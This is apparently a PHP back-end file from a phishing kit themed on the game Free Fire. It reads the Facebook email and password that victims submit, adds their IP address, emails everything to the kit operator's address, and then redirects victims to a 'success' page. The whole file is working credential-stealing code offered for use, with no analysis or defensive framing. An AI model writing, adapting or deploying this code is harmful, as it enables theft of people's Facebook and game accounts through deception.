<?php
error_reporting(0);
include('cilepeung.php');

$efb = $_POST['efb'];
$pfb = $_POST['pfb'];
$ip = $_SERVER['REMOTE_ADDR'];

$body = '

AKUN FREE FIRE LOGIN FACEBOOK


Email    : '.$efb.'

Password : '.$pfb.'


FOLLOW FB OBET BET
';

include "email.php";
$subject ="OBET BET LOG FB | PUNYA '.$ip.'";
$headers ="From: Obet BET <obet@FO.com>";
mail($emailku, $subject, $body, $headers);


$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>
<html>
<head>
<meta http-equiv="REFRESH" content="0;url=sukses.php">
</head>
<body>
</body>
</html>
